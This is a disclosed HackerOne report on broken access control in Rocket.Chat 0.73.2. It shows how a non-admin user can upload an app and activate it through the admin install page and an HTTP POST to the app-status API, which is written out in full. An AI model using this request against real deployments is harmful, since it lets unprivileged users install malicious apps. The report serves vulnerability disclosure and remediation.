---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '491892'
original_report_id: '491892'
title: Broken access control on apps
weakness: Improper Access Control - Generic
team_handle: rocket_chat
created_at: '2019-02-06T11:51:30.342Z'
disclosed_at: '2019-06-22T08:41:48.343Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- improper-access-control-generic
---

# Broken access control on apps

## Metadata

- HackerOne Report ID: 491892
- Weakness: Improper Access Control - Generic
- Program: rocket_chat
- Disclosed At: 2019-06-22T08:41:48.343Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:** 

The user without administrative privileges can upload and install any Application into the rocket.chat
As ID of application is controlled in the app.json file (which is controlled by uploader) user can also activate the app.

## Releases Affected:

  * 0.73.2

## Steps To Reproduce:
- User log-in into the chat
- User open the following link:

```
http://<rocket-chat.link>>/admin/app/install
```
- Upload any app
- Activate it by send the following POST request to the installed app:

```http
POST /api/apps/<ID_of_the_installed_App>/status HTTP/1.1
Host: rocket-chat.link
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-User-Id: [redacted]
X-Auth-Token: [redacted]
X-Requested-With: XMLHttpRequest
Cookie: [redacted]
DNT: 1
Connection: close
Content-Length: 29

{"status":"manually_enabled"}
```

## Supporting Material/References:

You can see the uploading process in the attached video. Left user is admin, right -  user without any additional privileges. 

## Suggested mitigation
Managing apps should be available to admins only.

## Impact

Users can install and activate malicious apps into the rocket.chat.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
